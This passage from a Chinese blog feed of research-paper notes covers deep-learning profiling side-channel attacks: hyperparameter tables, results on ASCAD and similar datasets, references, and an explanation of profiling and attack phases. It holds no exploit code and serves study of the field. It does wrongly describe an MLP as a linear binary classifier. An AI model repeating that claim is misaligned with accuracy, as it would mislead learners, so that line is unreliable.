mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0191em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">16</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0191em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">层数索引</span></span></span></span></td>
<td>5,10</td>
</tr>
<tr>
<td>卷积核大小</td>
<td>26 To 52 （步长：2）</td>
<td>2,4</td>
</tr>
<tr>
<td>池化类型</td>
<td>Maxpooling，AvgPooling</td>
<td>AvgPooling</td>
</tr>
<tr>
<td>池化层大小</td>
<td>2,4,6,8,10</td>
<td>2</td>
</tr>
<tr>
<td>池化层步长</td>
<td>与层大小相同</td>
<td>2</td>
</tr>
<tr>
<td>Dense层数</td>
<td>1,2,3,4</td>
<td>1,2</td>
</tr>
<tr>
<td>神经元个数</td>
<td>10,20,50,100,200,300,400,500</td>
<td>50,100</td>
</tr>
<tr>
<td>激活函数</td>
<td>SeLU,ReLU</td>
<td>SeLU,ReLU</td>
</tr>
<tr>
<td>学习率</td>
<td>1e-3,1e-4,5e-3,5e-4</td>
<td>1e-3,1e-4</td>
</tr>
<tr>
<td>Batch Size</td>
<td>100 To 1 000 (步长：10)</td>
<td>200,400</td>
</tr>
<tr>
<td>权重初始化方案</td>
<td>ramdom,glorot, he_uniform</td>
<td>Glorot</td>
</tr>
<tr>
<td>正则</td>
<td>Dropout,None,l1,l2</td>
<td>None</td>
</tr>
<tr>
<td>搜索空间</td>
<td>&gt;1B</td>
<td>128</td>
</tr>
</tbody>
</table>
<h2 id="实验结果及分析">实验结果及分析</h2>
<p>图太多了，这里只给出最关键的NOPOI在三个不同数据集上的攻击结果（将猜测熵收敛到1所需要的能量迹条数）。</p>
<img src="../img/image-20241015145444756.png" alt="表1  ASCADf" style="zoom:50%;" />
<img src="../img/image-20241015145835688.png" alt="表2  ASCADr" style="zoom:50%;" />
<img src="../img/image-20241015145505338.png" alt="表3  DPAv4.2" style="zoom:50%;" />
<img src="../img/image-20241015145937693.png" alt="表4  CHESCTF_2018" style="zoom:50%;" />
<p>总览：</p>
<p><img src="../img/image-20241015150035631.png" alt="所有结果"></p>
<h1>总结</h1>
<p>本文主要提供了一个在原始能量迹上完成攻击的方案，改进了Lu等人的模型，在模型复杂度较低的前提下保证了攻击的效果。此外，作者做了大量的对比实验，论文代码：<a href="https://github.com/AISyLab/feature_selection_dlsca">https://github.com/AISyLab/feature_selection_dlsca</a></p>
<h1>参考文献</h1>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>Xiangjun Lu, Chi Zhang, Pei Cao, Dawu Gu, and Haining Lu. Pay attention to raw traces: A deep learning architecture for end-to-end profiling attacks. IACR Trans. Cryptogr. Hardw. Embed. Syst., 2021(3):235–274, 2021. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p>Olivier Bronchain, Julien M. Hendrickx, Clément Massart, Alex Olshevsky, and François-Xavier Standaert. Leakage certification revisited: Bounding model errors in side-channel security evaluations. In Alexandra Boldyreva and Daniele Micciancio, editors, Advances in Cryptology - CRYPTO 2019 39th Annual International Cryptology Conference, Santa Barbara, CA, USA, August 18-22, 2019, Proceedings, Part I, volume 11692 of Lecture Notes in Computer Science, pages 713–737. Springer, 2019. <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p>Loïc Masure, Cécile Dumas, and Emmanuel Prouff. A comprehensive study of deep learning for side-channel analysis. IACR Transactions on Cryptographic Hardware and Embedded Systems, 2020(1):348–375, Nov. 2019. <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p>Eloi de Chérisey, Sylvain Guilley, Olivier Rioul, and Pablo Piantanida. Best information is most successful mutual information and success rate in sidechannel analysis. IACR Trans. Cryptogr. Hardw. Embed. Syst., 2019(2):49–79, 2019. <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn5" class="footnote-item"><p>Loïc Masure, Nicolas Belleville, Eleonora Cagli, Marie-Angela Cornelie, Damien Couroussé, Cécile Dumas, and Laurent Maingault. Deep learning side-channel analysis on large-scale traces - A case study on a polymorphic AES. In Liqun Chen, Ninghui Li, Kaitai Liang, and Steve A. Schneider, editors, Computer Security - ESORICS 2020 - 25th European Symposium on Research in Computer Security, ESORICS 2020, Guildford, UK, September 14-18, 2020, Proceedings, Part I, volume 12308 of Lecture Notes in Computer Science, pages 440–460. Springer, 2020. <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn6" class="footnote-item"><p>Xiangjun Lu, Chi Zhang, Pei Cao, Dawu Gu, and Haining Lu. Pay attention to raw traces: A deep learning architecture for end-to-end profiling attacks. IACR Trans. Cryptogr. Hardw. Embed. Syst., 2021(3):235–274, 2021. <a href="#fnref6" class="footnote-backref">↩︎</a> <a href="#fnref6:1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>特征选择</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Multilabel Deep Learning-Based Side-Channel Attack</title>
    <url>/archives/1db5564d.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Libang Zhang , Xinpeng Xing , Member, IEEE, Junfeng Fan, Member, IEEE, Zongyue Wang, and Suying Wang</strong></p>
</li>
<li>
<p>单位：<strong>-</strong></p>
</li>
<li>
<p>出处：<strong>IEEE TRANSACTIONS ON COMPUTER-AIDED DESIGN OF INTEGRATED CIRCUITS AND SYSTEMS</strong></p>
</li>
<li>
<p>标题：<strong>Multilabel Deep Learning-Based Side-Channel Attack</strong></p>
</li>
</ul>
<h1>文章内容</h1>
<h2 id="背景">背景</h2>
<p>近年来，将深度学习应用在侧信道攻击中的研究越来越多，特别是在模板攻击、泄露评估等方面，在 <a href="https://eprint.iacr.org/2018/053.pdf">Study of Deep Learning Techniques for Side-Channel Analysis and Introduction to ASCAD Database</a> 那篇文章中，采用MLP、CNN模型对在设备上采集到的能量迹作分析，给出了指导性的超参数。在本论文中提到Lerman等人<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>首次使用SVM去分析3DES的密钥，成功分析单个比特密钥，并通过相同操作遍历来恢复整个密钥。Zaid等人<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> 引入权重可视化和热图来对泄露进行分析，并提出了一种根据去同步程度生成CNN架构的方法，本文作者在实验结果处主要与Z等人的结果做了对比。最后Perin<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>等人提出一种在SCA中使用集成学习的方法，对应在本文中是由几个弱分类器集成为单个强分类器。</p>
<h2 id="作者做了什么">作者做了什么</h2>
<ol>
<li>在DL-SCA中提出了多标签分类这种概念</li>
<li>将提出的方法应用到了ASCAD数据库的几种类别</li>
<li>给出了nn模型的结构</li>
</ol>
<h2 id="技术">技术</h2>
<h3 id="侧信道攻击">侧信道攻击</h3>
<p>将侧信道攻击划分为非建模侧信道攻击和建模侧信道攻击两种，对于非建模侧信道攻击，假设攻击者只能收集到目标设备的信息；而对于建模侧信道攻击，假设攻击者拥有与被目标设备相同的副本设备，可以事先对副本设备进行泄露采集分析，从而对被目标设备进行攻击。本文中针对后一种方法进行研究。</p>
<h4 id="建模侧信道攻击">建模侧信道攻击</h4>
<p>建模侧信道分建模阶段和攻击阶段，在深度学习中与之相对应的是训练阶段和测试阶段。</p>
<blockquote>
<p>建模阶段</p>
</blockquote>
<p>在建模阶段攻击者建立数据集<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mrow><mi>t</mi><mi>r</mi><mi>a</mi><mi>i</mi><mi>n</mi></mrow></msub><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>Y</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>N</mi><mi>t</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">D_{train} = \{(X_i, Y_i)|i = 1, 2, ..., N_t\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">ain</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>,其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">X_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>代表第i条能量迹，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">Y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示对应的标签,总共有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">N_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>对, 这里攻击者知道对应加密密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">K_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">C_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,通过建立泄露模型<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><msub><mi>K</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>P</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>C</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V_i=L(K_i,P_i,C_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>来计算泄露的数据,通过应用功率模型表示<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mi>i</mi></msub><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><msub><mi>V</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Y_i = \varphi(V_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>,通过一个估计模型即函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>P</mi><mo separator="true">,</mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(X,P,C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span>来表示训练集。</p>
<blockquote>
<p>攻击阶段</p>
</blockquote>
<p>攻击者通过对函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>P</mi><mo separator="true">,</mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(X,P,C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span>以及泄露模型<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span>和功率模型<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi></mrow><annotation encoding="application/x-tex">\varphi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">φ</span></span></span></span>来预测正确的密钥, 本文介绍这方面时这里作者写的有一点歧义,他写的在目标设备上基于已知的明文和密文,以及要攻击的能量迹来推测出密钥,已知被攻击的设备明文密文了还推测密钥</p>
<h3 id="深度学习">深度学习</h3>
<p>相较于机器学习,深度学习采取NN(神经网络)的形式,即通过堆叠多个神经层,神经层中包含多个神经元来表面上模拟人脑工作机制,早期的ML模型为多层感知机模型(Multilayer Perceptron, MLP),以及目前在DL-SCA中广泛应用改进的卷积神经网络模型(Convolutional Neural Network, CNN).</p>
<blockquote>
<p>MLP</p>
</blockquote>
<p>MLP是线性分类模型,主要用来做二分类任务,将结果一分为二,阳性为1,阴性为-1,其工作形式可以用公式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>s</mi><mi>i</mi><mi>g</mi><mi>n</mi><mo stretchy="false">(</mo><mi>w</mi><mo>⋅</mo><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=sign(w\cdot x + b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span>来表示,sign只表示一种方法,即复合函数</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mi>i</mi><mi>g</mi><mi>n</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>≥</mo><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>&lt;</mo><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">sign(x)=
\left\{
\begin{array}{ll}
1,&amp;x \ge 0,\\
-1,&amp;x &lt; 0,
\end{array}
\right.
